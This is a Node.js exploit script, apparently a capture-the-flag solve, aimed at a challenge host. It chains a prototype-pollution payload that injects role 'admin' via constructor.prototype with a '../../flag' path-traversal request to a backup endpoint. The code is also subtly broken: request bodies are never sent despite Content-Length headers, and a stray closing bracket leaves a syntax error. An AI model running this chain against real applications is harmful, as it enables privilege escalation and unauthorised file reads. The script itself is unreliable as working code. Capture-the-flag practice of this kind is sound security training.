
const http = require('http');
const querystring = require('querystring');

function makeRequest(options, cb) {
  const request = http.request(options, (res) => {
    let data = '';
    res.on('data', (chunk) => {
      data += chunk;
    });
    res.on('end', () => {
      cb(null, res, data);
    });
  });
  request.on('error', (err) => {
    cb(err);
  });
  request.end();
}

// 正确步骤：先污染原型，再注册
makeRequest({
  hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
  port: 80,
  path: '/login',
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Content-Length': Buffer.byteLength(querystring.stringify({uid: 'b050bd44d7a04038b2363d3d9c153b32'}))
  }
}, (err, res, body) => {
  const cookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
  console.log("✅ Logged in, polluting...");
  const poisonData = JSON.stringify({
    uid: 'b050bd44d7a04038b2363d3d9c153b32',
    "constructor": {
      "prototype": {
        "role": "admin"
      }
    }
  });
  makeRequest({
    hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
    port: 80,
    path: '/api/profile',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(Buffer.from(poisonData)),
      'Cookie': cookie
    }
  }, (err, res, pbody) => {
    console.log("✅ Polluted, registering new user...");
    makeRequest({
      hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
      port: 80,
      path: '/register',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(querystring.stringify({username: 'flagfinaluser'}))
      }
    }, (err, res, rbody) => {
      const match = rbody.match(/<span.*?>([a-f0-9]+)<\/span>/);
      const newUid = match[1];
      console.log("✅ Registered new user, UID: " + newUid);
      console.log("✅ Login new user...");
      makeRequest({
        hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
        port: 80,
        path: '/login',
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Content-Length': Buffer.byteLength(querystring.stringify({uid: newUid}))
        }
      }, (err, res, lbody) => {
        const newCookie = res.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
        console.log("✅ Logged in, requesting flag...");
        makeRequest({
          hostname: '8080-3c5613b7-13e9-44c2-ab26-3b1ad1fa4904.challenge.ctfplus.cn',
          port: 80,
          path: '/api/backup',
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(querystring.stringify({file: '../../flag'})),
            'Cookie': newCookie
          }
        }, (err, res, flagbody) => {
          console.log("\n\n===================");
          console.log("🏁  FLAG  🏁");
          console.log(flagbody);
          console.log("===================");
        });
      });
    });
  });
});
});
